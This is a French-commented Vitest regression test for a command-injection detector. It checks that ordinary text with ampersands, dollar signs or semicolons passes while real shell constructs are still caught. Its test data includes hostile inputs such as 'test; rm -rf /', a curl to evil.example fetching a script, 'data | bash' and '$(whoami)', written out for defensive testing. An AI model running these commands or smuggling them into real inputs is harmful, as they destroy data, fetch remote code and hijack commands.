/**
 * Regression: la detection d'injection de commande ne doit pas rejeter du
 * texte ordinaire.
 *
 * L'ancienne regle signalait toute chaine contenant `;`, `&`, `|`, un accent
 * grave ou `$`. Consequence en production (2026-07-24): le triage IA de la
 * boite Gmail echouait systematiquement en 400, parce que l'extrait d'un
 * e-mail envoye par un TIERS contenait un de ces caracteres. Chaque rejet
 * incrementait en plus le compteur de menaces, cinq occurrences suffisant a
 * bannir l'adresse pendant 30 minutes: le destinataire etait puni pour le
 * contenu du courrier qu'il recevait.
 *
 * Cette suite verrouille les deux cotes: le texte anodin passe, la vraie
 * construction shell est toujours detectee.
 */
import { describe, expect, it } from "vitest";
import { detectThreatInValue } from "../middleware/security";

const benign = [
  "Dupont & Fils — devis accepte",
  "Budget valide: 500$ HT",
  "Reunion demain; merci de confirmer",
  "Choix A | Choix B",
  "Tarif 20$/mois, remise 10%",
  "R&D: prototype livre",
  "Re: facture #2024-118 ; relance",
  "Cordialement,\nJean & Marie",
  // Volontairement tolere: les noms de commande de une ou deux lettres (`id`,
  // `ps`, `sh` seul) apparaissent couramment dans un extrait de code cite en
  // markdown. Les inclure ferait revenir precisement le faux positif que ce
  // correctif elimine — et le serveur n'execute de toute facon aucun shell.
  "Recuperez l'`id` du client puis relancez",
];

const malicious = [
  "test; rm -rf /",
  "value && curl http://evil.example/x.sh",
  "data | bash",
  "$(whoami)",
  "`whoami`",
  "foo; /bin/sh",
];

describe("detection d'injection de commande", () => {
  it.each(benign)("laisse passer du texte ordinaire: %s", (value) => {
    const threat = detectThreatInValue({ snippet: value }, "body");
    expect(threat).toBeNull();
  });

  it.each(malicious)("detecte une construction shell reelle: %s", (value) => {
    const threat = detectThreatInValue({ snippet: value }, "body");
    expect(threat).toMatch(/Injection de commande/);
  });

  it("inspecte aussi les valeurs imbriquees dans un tableau", () => {
    const body = { emails: [{ snippet: "bonjour" }, { snippet: "x; rm -rf /" }] };
    expect(detectThreatInValue(body, "body")).toMatch(/emails\[1\]\.snippet/);
  });
});
